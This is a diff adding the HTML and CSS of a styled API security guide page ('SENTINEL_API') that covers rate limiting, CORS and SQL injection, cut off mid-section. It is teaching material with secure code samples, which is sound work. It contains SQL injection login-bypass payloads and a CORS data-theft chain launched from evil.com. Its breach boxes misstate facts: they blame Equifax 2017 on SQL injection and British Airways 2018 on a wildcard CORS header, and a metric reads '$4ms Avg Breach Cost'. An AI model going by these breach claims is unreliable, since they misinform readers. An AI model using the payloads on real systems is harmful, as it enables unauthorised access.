+  padding: 1.5rem;
+  background: var(--bg);
+  border-radius: 8px;
+}
+
+.modal-tools h3 {
+  font-family: var(--fw);
+  font-size: 0.95rem;
+  font-weight: 700;
+  color: var(--text);
+  text-transform: uppercase;
+  letter-spacing: 0.08em;
+  margin-bottom: 1rem;
+  margin-top: 0;
+}
+
+.modal-tools ul {
+  list-style: none;
+  padding: 0;
+  margin: 0;
+}
+
+.modal-tools li {
+  font-size: 0.8rem;
+  color: var(--muted2);
+  padding: 0.5rem 0;
+  padding-left: 1.5rem;
+  position: relative;
+}
+
+.modal-tools li::before {
+  content: '▸';
+  position: absolute;
+  left: 0;
+  color: var(--teal);
+  font-weight: bold;
+}
+
+.modal-insights {
+  padding: 1.5rem;
+  background: rgba(184,159,255,0.05);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+}
+
+.modal-insights h3 {
+  font-family: var(--fw);
+  font-size: 0.95rem;
+  font-weight: 700;
+  color: var(--teal);
+  text-transform: uppercase;
+  letter-spacing: 0.08em;
+  margin-bottom: 1rem;
+  margin-top: 0;
+}
+
+.modal-insights p {
+  font-size: 0.8rem;
+  line-height: 1.6;
+  color: var(--muted2);
+  margin: 0.5rem 0;
+}
+
+@media (max-width: 768px) {
+  .modal-body {
+    grid-template-columns: 1fr;
+  }
+  .modal-canvas-wrap {
+    min-height: 300px;
+  }
+  .modal-content {
+    width: 95%;
+    max-height: 90vh;
+  }
+}
+.ptags { display:flex; flex-wrap:wrap; gap:.35rem; }
+.ptag {
+  background:rgba(255,255,255,.04);
+  border:1px solid var(--border);
+  padding:.18rem .55rem;
+  border-radius:2px;
+  font-size:.58rem;
+  color:var(--muted);
+  letter-spacing:.05em;
+}
+
+/* ─── ADDITIONAL TOPICS ────────────────────────── */
+.add-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(300px,1fr));
+  gap: 1.25rem;
+  margin-top: 3rem;
+}
+.add-card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 1.75rem;
+  cursor: none;
+  transition: border-color .3s, transform .3s;
+}
+.add-card:hover { border-color:rgba(0,200,160,.18); transform:translateY(-3px); }
+.add-top { display:flex; align-items:flex-start; justify-content:space-between; margin-bottom:.85rem; }
+.add-icon { width:40px; height:40px; border-radius:8px; background:rgba(255,255,255,.04); display:flex; align-items:center; justify-content:center; font-size:1.2rem; }
+.add-title { font-family:var(--fw); font-size:.98rem; font-weight:700; margin-bottom:.5rem; }
+.add-body { font-size:.76rem; color:#7a8aaa; line-height:1.9; margin-bottom:1.1rem; }
+.add-tips { list-style:none; font-size:.7rem; color:#7a8aaa; display:flex; flex-direction:column; gap:.3rem; }
+.add-tips li::before { content:'▸ '; color:var(--teal); }
+
+/* ─── COMMAND CENTER (observability) ───────────── */
+.cmd-layout {
+  display: grid;
+  grid-template-columns: 1fr 1.2fr;
+  gap: 4rem;
+  align-items: center;
+}
+.metric-row {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: .65rem 0;
+  border-bottom: 1px solid rgba(255,255,255,.03);
+  font-size: .73rem;
+}
+.metric-row:last-child { border-bottom:none; }
+.mr-name { color:var(--muted2); }
+.mr-val { font-family:var(--fw); font-weight:700; color:var(--teal); }
+.mr-val.red { color:var(--red); }
+.mr-val.amber { color:var(--amber); }
+.log-stream {
+  background: var(--bg);
+  border:1px solid var(--border);
+  border-radius:8px;
+  padding:1rem 1.25rem;
+  font-size:.67rem;
+  line-height:2;
+  max-height:280px;
+  overflow:hidden;
+  position:relative;
+}
+.log-stream::after {
+  content:'';
+  position:absolute;
+  bottom:0; left:0; right:0;
+  height:60px;
+  background:linear-gradient(transparent,var(--bg));
+}
+.log-ok { color:var(--teal); }
+.log-warn { color:var(--amber); }
+.log-err { color:var(--red); }
+.log-info { color:var(--muted); }
+.log-time { color:var(--blue); margin-right:.5rem; }
+
+/* ─── FINAL CTA ────────────────────────────────── */
+.cta-section {
+  text-align:center;
+  padding:8rem 3rem;
+  position:relative;
+  overflow:hidden;
+}
+.cta-bg {
+  position:absolute;
+  inset:0;
+  background:
+    radial-gradient(ellipse 60% 50% at 50% 50%, rgba(0,200,160,.07) 0%, transparent 70%),
+    radial-gradient(ellipse 40% 40% at 80% 20%, rgba(76,201,240,.04) 0%, transparent 70%);
+}
+.cta-grid {
+  position:absolute;
+  inset:0;
+  background-image:
+    linear-gradient(rgba(0,200,160,.03) 1px,transparent 1px),
+    linear-gradient(90deg,rgba(0,200,160,.03) 1px,transparent 1px);
+  background-size:48px 48px;
+  mask-image:radial-gradient(ellipse at center,black 30%,transparent 75%);
+}
+.cta-title {
+  font-family:var(--fw);
+  font-size:clamp(2.5rem,5vw,4rem);
+  font-weight:800;
+  letter-spacing:-0.025em;
+  line-height:1.05;
+  margin-bottom:.85rem;
+  position:relative;
+}
+.cta-sub {
+  font-family:var(--fi);
+  font-style:italic;
+  font-size:1.1rem;
+  color:var(--muted2);
+  max-width:480px;
+  margin:0 auto 2.5rem;
+  line-height:1.65;
+  position:relative;
+}
+.cta-btns { display:flex; gap:.75rem; justify-content:center; position:relative; }
+
+/* ─── FOOTER ───────────────────────────────────── */
+footer {
+  background:var(--surface);
+  border-top:1px solid var(--border);
+  padding:3rem;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+}
+.ft-logo { font-family:var(--fw); font-weight:800; font-size:1rem; color:var(--teal); }
+.ft-copy { font-size:.62rem; color:var(--muted); line-height:1.6; max-width:400px; text-align:center; }
+.ft-links { display:flex; gap:1.5rem; list-style:none; }
+.ft-links a { font-size:.63rem; color:var(--muted); text-decoration:none; letter-spacing:.08em; text-transform:uppercase; transition:color .2s; }
+.ft-links a:hover { color:var(--teal); }
+
+/* ─── REVEAL ───────────────────────────────────── */
+.reveal {
+  opacity:0;
+  transform:translateY(35px);
+  transition:opacity .7s ease,transform .7s ease;
+}
+.reveal.in { opacity:1; transform:none; }
+.reveal-d1 { transition-delay:.1s; }
+.reveal-d2 { transition-delay:.2s; }
+.reveal-d3 { transition-delay:.3s; }
+
+/* ─── PARALLAX BG BLOBS ─────────────────────────  */
+.blob {
+  position:absolute;
+  border-radius:50%;
+  filter:blur(80px);
+  pointer-events:none;
+  will-change:transform;
+}
+
+/* ─── CHECKLIST ─────────────────────────────────  */
+.checklist { display:flex; flex-direction:column; gap:.45rem; margin-top:.85rem; }
+.ci {
+  display:flex;
+  align-items:center;
+  gap:.65rem;
+  font-size:.73rem;
+  color:#7a8aaa;
+  padding:.45rem 0;
+  border-bottom:1px solid rgba(255,255,255,.03);
+}
+.ci:last-child{border-bottom:none;}
+.ci-icon{font-size:.85rem;flex-shrink:0;}
+
+/* ─── RESPONSIVE ────────────────────────────────  */
+@media(max-width:1100px) {
+  .sidebar{display:none;}
+  .main{margin-left:0;}
+  .topbar{left:0;}
+  .main::before{left:0;}
+  .hero-terminal{display:none;}
+  .two-col,.two-col.flip{grid-template-columns:1fr; direction:ltr;}
+  .vis-panel{position:static;}
+  .cmd-layout{grid-template-columns:1fr;}
+}
+@media(max-width:768px){
+  .section{padding:4rem 1.5rem;}
+  .hero{padding:5rem 1.5rem 3rem;}
+  .hero-metrics{gap:1.75rem; flex-wrap:wrap;}
+  .cards-2{grid-template-columns:1fr;}
+  footer{flex-direction:column;gap:1.5rem;text-align:center;}
+}
+</style>
+</head>
+<body>
+
+<div id="cur"></div>
+<div id="cur-ring"></div>
+<div id="prog"></div>
+
+<!-- ═══════════════════════════════ SIDEBAR ══ -->
+<aside class="sidebar">
+  <div class="sb-logo">
+    <div class="sb-logo-text">SENTINEL_API</div>
+    <div class="sb-logo-sub">Security Intelligence</div>
+  </div>
+
+  <div class="sb-section">
+    <div class="sb-section-label">Overview</div>
+    <a href="#hero" class="sb-link active"><span class="sb-icon">⌂</span> Dashboard</a>
+    <a href="#threats" class="sb-link"><span class="sb-icon">◎</span> Threat Map</a>
+  </div>
+
+  <div class="sb-section">
+    <div class="sb-section-label">Attack Vectors</div>
+    <a href="#rate-limiting" class="sb-link"><span class="sb-icon">🚦</span> Rate Limiting <span class="sb-dot sb-dot-high"></span></a>
+    <a href="#cors" class="sb-link"><span class="sb-icon">🌐</span> CORS <span class="sb-dot sb-dot-high"></span></a>
+    <a href="#sqli" class="sb-link"><span class="sb-icon">💉</span> SQL Injection <span class="sb-dot sb-dot-critical"></span></a>
+    <a href="#csrf" class="sb-link"><span class="sb-icon">🎭</span> CSRF <span class="sb-dot sb-dot-high"></span></a>
+    <a href="#xss" class="sb-link"><span class="sb-icon">⚡</span> XSS <span class="sb-dot sb-dot-critical"></span></a>
+    <a href="#jwt" class="sb-link"><span class="sb-icon">🔑</span> JWT & Auth <span class="sb-dot sb-dot-critical"></span></a>
+    <a href="#oauth" class="sb-link"><span class="sb-icon">🔐</span> OAuth2 & OIDC <span class="sb-dot sb-dot-high"></span></a>
+  </div>
+
+  <div class="sb-section">
+    <div class="sb-section-label">Defense</div>
+    <a href="#command" class="sb-link"><span class="sb-icon">⌘</span> Command Center</a>
+    <a href="#observability" class="sb-link"><span class="sb-icon">👁</span> Observability</a>
+    <a href="#practices" class="sb-link"><span class="sb-icon">✓</span> Best Practices</a>
+  </div>
+
+  <div class="sb-footer">
+    <div class="sb-status">
+      <span class="sb-status-dot"></span>
+      <span>Live threat feed active</span>
+    </div>
+    <div>OWASP Top 10 · 2025 Edition</div>
+  </div>
+</aside>
+
+<!-- ═══════════════════════════════ MAIN ══════ -->
+<div class="main">
+
+<!-- TOP BAR -->
+<div class="topbar">
+  <div class="topbar-path">sentinel_api / <span>security-guide</span> / overview</div>
+  <div class="topbar-actions">
+    <span class="tb-btn-ghost">System Status ✓</span>
+    <a href="#practices" class="tb-btn">Audit Checklist →</a>
+  </div>
+</div>
+
+<!-- ═══ HERO ═════════════════════════════════════ -->
+<section class="hero" id="hero">
+  <div class="hero-layer hero-bg1" data-parallax="0.2"></div>
+  <div class="hero-layer hero-grid" data-parallax="0.15"></div>
+  <div class="hero-layer hero-vignette"></div>
+  <div class="hero-scan"></div>
+
+  <!-- BG blobs -->
+  <div class="blob" style="width:500px;height:500px;background:rgba(0,200,160,.04);top:-100px;right:200px;" data-parallax="0.08"></div>
+  <div class="blob" style="width:300px;height:300px;background:rgba(255,69,83,.03);bottom:100px;right:400px;" data-parallax="0.12"></div>
+
+  <div class="hero-content">
+    <div class="hero-eyebrow">System Status: Active Monitoring · API Security Field Guide</div>
+    <h1 class="hero-title">
+      API Security:<br>
+      <span class="hl">The Invisible Perimeter</span>
+    </h1>
+    <p class="hero-lead">Modern infrastructure is held together by invisible threads of data. Every endpoint is a potential doorway. Welcome to the frontline of digital hardening.</p>
+    <div class="hero-cta">
+      <a href="#threats" class="btn-p">Explore Threats →</a>
+      <a href="#practices" class="btn-g">Audit Checklist</a>
+    </div>
+    <div class="hero-metrics">
+      <div>
+        <div class="metric-val">1.2T</div>
+        <div class="metric-label">API Requests / Day</div>
+      </div>
+      <div>
+        <div class="metric-val">46%</div>
+        <div class="metric-label">Attack Surfaces</div>
+      </div>
+      <div>
+        <div class="metric-val">$4ms</div>
+        <div class="metric-label">Avg Breach Cost</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Floating terminal -->
+  <div class="hero-terminal">
+    <div class="term-bar">
+      <span class="td td-r"></span>
+      <span class="td td-y"></span>
+      <span class="td td-g"></span>
+      <span class="term-title">sentinel-audit.js</span>
+    </div>
+    <div class="term-body">
+      <div class="tc">// API Security Assessment — Production</div>
+      <div><span class="tk">const</span> audit = {</div>
+      <div>&nbsp;&nbsp;<span class="tk">rateLimiting</span>: <span class="td2">false</span>, <span class="tc">// ⚠ EXPOSED</span></div>
+      <div>&nbsp;&nbsp;<span class="tk">corsPolicy</span>: <span class="ts">'*'</span>, <span class="tc">// ⚠ WILDCARD</span></div>
+      <div>&nbsp;&nbsp;<span class="tk">sqlSanitized</span>: <span class="td2">false</span>, <span class="tc">// ⚠ INJECTABLE</span></div>
+      <div>&nbsp;&nbsp;<span class="tk">csrfTokens</span>: <span class="td2">false</span>, <span class="tc">// ⚠ MISSING</span></div>
+      <div>&nbsp;&nbsp;<span class="tk">xssProtection</span>: <span class="td2">false</span>, <span class="tc">// ⚠ EXPOSED</span></div>
+      <div>&nbsp;&nbsp;<span class="tk">jwtValidation</span>: <span class="tw">'weak'</span>, <span class="tc">// ⚠ WEAK ALG</span></div>
+      <div>};</div>
+      <br>
+      <div><span class="tc">// Running perimeter scan...</span></div>
+      <div>sentinel.<span style="color:var(--purple)">scan</span>(<span class="ts">'production'</span>).<span style="color:var(--purple)">then</span>(r => {</div>
+      <div>&nbsp;&nbsp;console.<span style="color:var(--purple)">error</span>(<span class="ts">`${r.critical} critical`</span>);</div>
+      <div>&nbsp;&nbsp;<span class="tc">// 6 critical found 🚨</span></div>
+      <div>}); <span class="tcur"></span></div>
+    </div>
+  </div>
+</section>
+
+<!-- TICKER -->
+<div class="ticker">
+  <div class="tick-track">
+    <span class="tick-item">Rate Limiting <span class="tick-sep">◆</span></span>
+    <span class="tick-item">CORS Policy <span class="tick-sep">◆</span></span>
+    <span class="tick-item">SQL Injection <span class="tick-sep">◆</span></span>
+    <span class="tick-item">CSRF Protection <span class="tick-sep">◆</span></span>
+    <span class="tick-item">XSS Prevention <span class="tick-sep">◆</span></span>
+    <span class="tick-item">JWT Security <span class="tick-sep">◆</span></span>
+    <span class="tick-item">OAuth2 & OIDC <span class="tick-sep">◆</span></span>
+    <span class="tick-item">Input Validation <span class="tick-sep">◆</span></span>
+    <span class="tick-item">HTTPS / TLS 1.3 <span class="tick-sep">◆</span></span>
+    <span class="tick-item">Secrets Management <span class="tick-sep">◆</span></span>
+    <span class="tick-item">Rate Limiting <span class="tick-sep">◆</span></span>
+    <span class="tick-item">CORS Policy <span class="tick-sep">◆</span></span>
+    <span class="tick-item">SQL Injection <span class="tick-sep">◆</span></span>
+    <span class="tick-item">CSRF Protection <span class="tick-sep">◆</span></span>
+    <span class="tick-item">XSS Prevention <span class="tick-sep">◆</span></span>
+    <span class="tick-item">JWT Security <span class="tick-sep">◆</span></span>
+    <span class="tick-item">OAuth2 & OIDC <span class="tick-sep">◆</span></span>
+    <span class="tick-item">Input Validation <span class="tick-sep">◆</span></span>
+    <span class="tick-item">HTTPS / TLS 1.3 <span class="tick-sep">◆</span></span>
+    <span class="tick-item">Secrets Management <span class="tick-sep">◆</span></span>
+  </div>
+</div>
+
+<!-- ═══ THREAT OVERVIEW ═══════════════════════════ -->
+<section class="section section-alt" id="threats">
+  <div class="sec-num">// AREA 00 — THREAT LANDSCAPE</div>
+  <h2 class="sec-title reveal">Know Your<br>Attack Surface</h2>
+  <p class="sec-subtitle reveal">APIs are the backbone of modern applications — and the #1 target. Every endpoint is an entry point. Understanding each threat vector is mandatory before implementing defenses.</p>
+  <div class="threat-grid reveal">
+    <div class="threat-card" style="--tc:var(--amber)">
+      <div class="tc-icon">🚦</div>
+      <div class="tc-name">The Dam: Rate Limiting</div>
+      <div class="tc-risk risk-h">High Risk</div>
+    </div>
+    <div class="threat-card" style="--tc:var(--blue)">
+      <div class="tc-icon">🌐</div>
+      <div class="tc-name">The Guest List: CORS</div>
+      <div class="tc-risk risk-h">High Risk</div>
+    </div>
+    <div class="threat-card" style="--tc:var(--red)">
+      <div class="tc-icon">💉</div>
+      <div class="tc-name">Poisoned Query: SQLi</div>
+      <div class="tc-risk risk-c">Critical</div>
+    </div>
+    <div class="threat-card" style="--tc:var(--purple)">
+      <div class="tc-icon">🎭</div>
+      <div class="tc-name">Hijacked Session: CSRF</div>
+      <div class="tc-risk risk-h">High Risk</div>
+    </div>
+    <div class="threat-card" style="--tc:var(--red)">
+      <div class="tc-icon">⚡</div>
+      <div class="tc-name">Trojan Script: XSS</div>
+      <div class="tc-risk risk-c">Critical</div>
+    </div>
+    <div class="threat-card" style="--tc:var(--teal)">
+      <div class="tc-icon">🔑</div>
+      <div class="tc-name">Digital Passport: JWT</div>
+      <div class="tc-risk risk-c">Critical</div>
+    </div>
+    <div class="threat-card" style="--tc:var(--teal)">
+      <div class="tc-icon">🔐</div>
+      <div class="tc-name">Sovereign Key: OAuth2</div>
+      <div class="tc-risk risk-h">High Risk</div>
+    </div>
+    <div class="threat-card" style="--tc:var(--amber)">
+      <div class="tc-icon">📊</div>
+      <div class="tc-name">All-Seeing Eye: Observability</div>
+      <div class="tc-risk risk-h">High Risk</div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ RATE LIMITING ════════════════════════════ -->
+<section class="section" id="rate-limiting">
+  <div class="blob" style="width:400px;height:400px;background:rgba(255,179,64,.03);top:-50px;right:-100px;" data-parallax="0.1"></div>
+  <div class="two-col">
+    <div>
+      <div class="sec-num">// AREA 01 — THROTTLE & PROTECT</div>
+      <div class="t-badge badge-amber">🚦 The Dam: Rate Limiting</div>
+      <h2 class="topic-title reveal">Uncontrolled Traffic<br>Floods Your Pipeline</h2>
+      <p class="topic-sub reveal">Without rate limiting, a single bot can drain your server, brute-force credentials, or scrape your entire database — in seconds.</p>
+      <p class="topic-body reveal">Rate limiting enforces request quotas per client, IP, or API key within a sliding time window. It's your first line of defense against brute-force attacks, credential stuffing, DDoS, and excessive scraping. Without it, your compute and your data are unlimited free resources for attackers.</p>
+
+      <div class="flow reveal">
+        <div class="flow-label">⚔ Attack Progression</div>
+        <div class="flow-step" data-n="1" style="--step-c:var(--red)"><strong>Bot deployed</strong> — attacker spins up thousands of concurrent requests to <code style="color:var(--amber)">/api/login</code></div>
+        <div class="flow-step" data-n="2" style="--step-c:var(--amber)"><strong>Credential stuffing</strong> — leaked password lists tested at machine speed, ~10k req/min</div>
+        <div class="flow-step" data-n="3" style="--step-c:var(--red)"><strong>Server overwhelmed</strong> — legitimate users get 503s, revenue impact begins immediately</div>
+        <div class="flow-step" data-n="4" style="--step-c:var(--safe)"><strong>Rate limiter fires</strong> — 429 Too Many Requests, attacker IP blocked, exponential backoff applied</div>
+      </div>
+
+      <div class="cards-2 reveal">
+        <div class="mini-card">
+          <div class="mini-card-t">🛡 Algorithms</div>
+          <ul>
+            <li>Token Bucket (burst-friendly)</li>
+            <li>Sliding Window Counter</li>
+            <li>Fixed Window (simplest)</li>
+            <li>Leaky Bucket (smooth output)</li>
+            <li>Redis for distributed state</li>
+          </ul>
+        </div>
+        <div class="mini-card">
+          <div class="mini-card-t">⚖ Trade-offs</div>
+          <ul>
+            <li>✓ Stops brute-force cold</li>
+            <li>✓ Prevents DDoS amplification</li>
+            <li>✓ Reduces infra cost</li>
+            <li class="neg">✗ Can block power users</li>
+            <li class="warn">✗ Needs per-endpoint tuning</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="rw-box reveal">
+        <div class="rw-label">Real-World Breach</div>
+        <div class="rw-text"><strong>Krebs on Security 2016</strong> — Mirai botnet generated 620 Gbps against OVH using IoT devices. No rate limiting at the edge layer meant the attack bypassed all application defenses. Modern mitigation requires rate limiting at CDN, load balancer, and API gateway levels simultaneously.</div>
+      </div>
+    </div>
+
+    <div class="reveal reveal-d2">
+      <div class="vis-panel">
+        <div class="vis-head">
+          <span>🚦</span>
+          <span class="vis-title">Live Rate Monitor — /api/login</span>
+          <span class="vis-badge tag-bad">● UNDER ATTACK</span>
+        </div>
+        <div class="vis-body">
+          <div style="font-size:.65rem;color:var(--muted);margin-bottom:.85rem;">Request quotas per 15-minute window (100 req max)</div>
+          <div class="meter-row"><span class="ml">User A</span><div class="mbar"><div class="mfill m-safe" style="width:28%"></div></div><span class="mv">28/100</span></div>
+          <div class="meter-row"><span class="ml">User B</span><div class="mbar"><div class="mfill m-warn" style="width:71%"></div></div><span class="mv">71/100</span></div>
+          <div class="meter-row"><span class="ml">Bot 🤖</span><div class="mbar"><div class="mfill m-red" style="width:100%"></div></div><span class="mv">100/100</span></div>
+          <div class="meter-row"><span class="ml">API Key</span><div class="mbar"><div class="mfill m-safe" style="width:14%"></div></div><span class="mv">14/100</span></div>
+          <div class="rate-alert">
+            <div class="rdot"></div>
+            <span>429 Too Many Requests — Bot IP 45.33.xx.xx throttled for 300s</span>
+          </div>
+
+          <div class="code-block" style="margin-top:1rem;">
+            <div class="cb-head">
+              <span class="cb-lang">Node.js + express-rate-limit</span>
+              <span class="cb-tag tag-good">✓ Secure</span>
+            </div>
+            <div class="cb-body">
+              <div><span class="ck">import</span> rateLimit <span class="ck">from</span> <span class="cs">'express-rate-limit'</span>;</div>
+              <div><span class="ck">import</span> RedisStore <span class="ck">from</span> <span class="cs">'rate-limit-redis'</span>;</div>
+              <br>
+              <div><span class="cc">// Strict limit for auth endpoints</span></div>
+              <div><span class="ck">const</span> authLimiter = <span class="cf">rateLimit</span>({</div>
+              <div>&nbsp;&nbsp;windowMs: <span class="cn">15</span> * <span class="cn">60</span> * <span class="cn">1000</span>, <span class="cc">// 15 min</span></div>
+              <div>&nbsp;&nbsp;max: <span class="cn">10</span>, <span class="cc">// 10 attempts max</span></div>
+              <div>&nbsp;&nbsp;store: <span class="ck">new</span> <span class="cf">RedisStore</span>({ client }),</div>
+              <div>&nbsp;&nbsp;handler: (req, res) => {</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;res.<span class="cf">status</span>(<span class="cn">429</span>).<span class="cf">json</span>({</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error: <span class="cs">'Too many attempts'</span>,</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retryAfter: res.<span class="cf">getHeader</span>(<span class="cs">'Retry-After'</span>)</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;});</div>
+              <div>&nbsp;&nbsp;}</div>
+              <div>});</div>
+              <br>
+              <div>app.<span class="cf">use</span>(<span class="cs">'/api/auth'</span>, authLimiter);</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ CORS ═════════════════════════════════════ -->
+<section class="section section-dark" id="cors">
+  <div class="two-col flip">
+    <div>
+      <div class="sec-num">// AREA 02 — ORIGIN ENFORCEMENT</div>
+      <div class="t-badge badge-blue">🌐 The Guest List: CORS</div>
+      <h2 class="topic-title reveal">Cross-Origin Resource<br>Sharing — Done Right</h2>
+      <p class="topic-sub reveal">Cross-Origin Resource Sharing is the protocol that defines who gets in to your API's VIP area. It's the diplomatic corps of the internet.</p>
+      <p class="topic-body reveal">CORS is a browser-enforced security mechanism restricting which origins can read responses from your API. Misconfigured CORS — especially <code style="color:var(--blue)">Access-Control-Allow-Origin: *</code> with credentials — lets any malicious site silently read your users' private data using their own authenticated sessions.</p>
+
+      <div class="flow reveal">
+        <div class="flow-label">⚔ Wildcard Exploit Chain</div>
+        <div class="flow-step" data-n="1" style="--step-c:var(--blue)"><strong>Victim authenticated</strong> — logged into yourbank.com, session cookie present</div>
+        <div class="flow-step" data-n="2" style="--step-c:var(--amber)"><strong>Evil.com visited</strong> — attacker's site triggers <code style="color:var(--amber)">fetch('https://yourbank.com/api/balance')</code></div>
+        <div class="flow-step" data-n="3" style="--step-c:var(--red)"><strong>Wildcard permits it</strong> — <code style="color:var(--red)">Access-Control-Allow-Origin: *</code> allows the cross-origin read</div>
+        <div class="flow-step" data-n="4" style="--step-c:var(--red)"><strong>Data exfiltrated</strong> — account balances, PII, tokens extracted silently</div>
+      </div>
+
+      <div class="cards-2 reveal">
+        <div class="mini-card">
+          <div class="mini-card-t">🛡 Best Practices</div>
+          <ul>
+            <li>Explicit origin allowlist always</li>
+            <li>Never wildcard (*) with credentials</li>
+            <li>Restrict Allow-Methods tightly</li>
+            <li>Validate Origin server-side</li>
+            <li>Review on every deploy</li>
+          </ul>
+        </div>
+        <div class="mini-card">
+          <div class="mini-card-t">🔍 Headers to Set</div>
+          <ul>
+            <li>Access-Control-Allow-Origin</li>
+            <li>Access-Control-Allow-Methods</li>
+            <li>Access-Control-Allow-Headers</li>
+            <li>Access-Control-Max-Age</li>
+            <li class="warn">Vary: Origin (caching!)</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="rw-box reveal">
+        <div class="rw-label">Real-World Breach</div>
+        <div class="rw-text"><strong>British Airways 2018</strong> — Magecart exploited CORS misconfiguration to exfiltrate payment data from 500k customers over 15 days undetected. The £183M GDPR fine resulted from a single wildcard CORS header on the checkout API. Always audit third-party script access to your API origins.</div>
+      </div>
+    </div>
+
+    <div class="reveal reveal-d2">
+      <div class="vis-panel">
+        <div class="vis-head">
+          <span>🌐</span>
+          <span class="vis-title">CORS Origin Inspector</span>
+          <span class="vis-badge tag-bad">⚠ Misconfigured</span>
+        </div>
+        <div class="vis-body">
+          <div style="font-size:.63rem;color:var(--muted);margin-bottom:.85rem;">Evaluating Access-Control-Allow-Origin policy:</div>
+          <div class="cors-row"><span class="cors-origin">https://yourapp.com</span><span class="cors-status cs-ok">✓ ALLOWED</span></div>
+          <div class="cors-arrow">↕ Origin header evaluated against allowlist</div>
+          <div class="cors-row"><span class="cors-origin">https://partner.yourapp.com</span><span class="cors-status cs-warn">~ WITH CREDENTIALS</span></div>
+          <div class="cors-arrow">↕ Preflight OPTIONS — 204 returned</div>
+          <div class="cors-row"><span class="cors-origin">https://evil-site.com</span><span class="cors-status cs-block">✗ BLOCKED</span></div>
+          <div class="cors-arrow">↕ Wildcard check — DANGER</div>
+          <div class="cors-row" style="border-color:rgba(255,69,83,.35)"><span class="cors-origin" style="color:var(--red)">Access-Control-Allow-Origin: *</span><span class="cors-status cs-block">✗ CRITICAL</span></div>
+
+          <div class="code-block" style="margin-top:1rem;">
+            <div class="cb-head">
+              <span class="cb-lang">Express.js</span>
+              <span class="cb-tag tag-good">✓ Secure</span>
+            </div>
+            <div class="cb-body">
+              <div><span class="cc">// Explicit allowlist — never use '*'</span></div>
+              <div><span class="ck">const</span> allowedOrigins = [</div>
+              <div>&nbsp;&nbsp;<span class="cs">'https://app.yourco.com'</span>,</div>
+              <div>&nbsp;&nbsp;<span class="cs">'https://admin.yourco.com'</span>,</div>
+              <div>];</div>
+              <br>
+              <div>app.<span class="cf">use</span>(<span class="cf">cors</span>({</div>
+              <div>&nbsp;&nbsp;origin: (origin, callback) => {</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;<span class="ck">if</span> (!origin || allowedOrigins.<span class="cf">includes</span>(origin))</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cf">callback</span>(<span class="ck">null</span>, <span class="ck">true</span>);</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;<span class="ck">else</span> <span class="cf">callback</span>(<span class="ck">new</span> Error(<span class="cs">'CORS: Origin blocked'</span>));</div>
+              <div>&nbsp;&nbsp;},</div>
+              <div>&nbsp;&nbsp;credentials: <span class="ck">true</span>,</div>
+              <div>&nbsp;&nbsp;methods: [<span class="cs">'GET'</span>, <span class="cs">'POST'</span>, <span class="cs">'PUT'</span>],</div>
+              <div>}));</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ SQL INJECTION ════════════════════════════ -->
+<section class="section" id="sqli">
+  <div class="blob" style="width:450px;height:450px;background:rgba(255,69,83,.03);bottom:-80px;left:-100px;" data-parallax="0.1"></div>
+  <div class="two-col">
+    <div>
+      <div class="sec-num">// AREA 03 — DATABASE INFILTRATION</div>
+      <div class="t-badge badge-red">💉 The Poisoned Query: SQLi</div>
+      <h2 class="topic-title reveal">When User Input<br>Becomes a Weapon</h2>
+      <p class="topic-sub reveal">SQL Injection has topped the OWASP list for decades. One unsanitized string hands an attacker the keys to your entire database kingdom.</p>
+      <p class="topic-body reveal">SQLi occurs when attacker-controlled input is interpolated directly into database queries. The injected SQL alters query logic — bypassing authentication, extracting arbitrary tables, modifying records, or executing OS commands via <code style="color:var(--amber)">xp_cmdshell</code> on SQL Server. It's consistently the most damaging vulnerability class by breach cost.</p>
+
+      <div class="flow reveal">
+        <div class="flow-label">⚔ Authentication Bypass</div>
+        <div class="flow-step" data-n="1" style="--step-c:var(--red)"><strong>Target identified</strong> — login form, search endpoint, user profile URL parameter</div>
+        <div class="flow-step" data-n="2" style="--step-c:var(--red)"><strong>Payload crafted</strong> — <code style="color:var(--amber)">admin'-- </code> or <code style="color:var(--amber)">' OR '1'='1</code> injected into username field</div>
+        <div class="flow-step" data-n="3" style="--step-c:var(--amber)"><strong>Query broken</strong> — WHERE clause evaluates to TRUE for all rows</div>
+        <div class="flow-step" data-n="4" style="--step-c:var(--red)"><strong>Admin access</strong> — first user (typically admin) returned without password check</div>
+      </div>
+
+      <div class="cards-2 reveal">
+        <div class="mini-card">
+          <div class="mini-card-t">🛡 Defenses</div>
+          <ul>
+            <li>Parameterized queries (always)</li>
+            <li>Stored procedures with params</li>
+            <li>ORM with safe query builders</li>
+            <li>Input validation + allowlists</li>
+            <li>Least-privilege DB accounts</li>
+          </ul>
+        </div>
+        <div class="mini-card">
+          <div class="mini-card-t">🎯 SQLi Variants</div>
+          <ul>
+            <li>Classic in-band</li>
+            <li>Blind boolean-based</li>
+            <li>Time-based blind</li>
+            <li class="neg">Error-based extraction</li>
+            <li class="warn">Second-order injection</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="rw-box reveal">
+        <div class="rw-label">Real-World Breach</div>
+        <div class="rw-text"><strong>Equifax 2017</strong> — SQLi combined with an unpatched Apache Struts CVE exposed 147 million Americans' SSNs, birth dates, and addresses. Settlement: $575M. A single parameterized query and a patched dependency would have prevented one of history's costliest breaches entirely.</div>
+      </div>
+    </div>
+
+    <div class="reveal reveal-d2">
+      <div class="vis-panel">
+        <div class="vis-head">
+          <span>💉</span>
+          <span class="vis-title">Query Comparison</span>
+          <span class="vis-badge tag-bad">🔴 Critical</span>
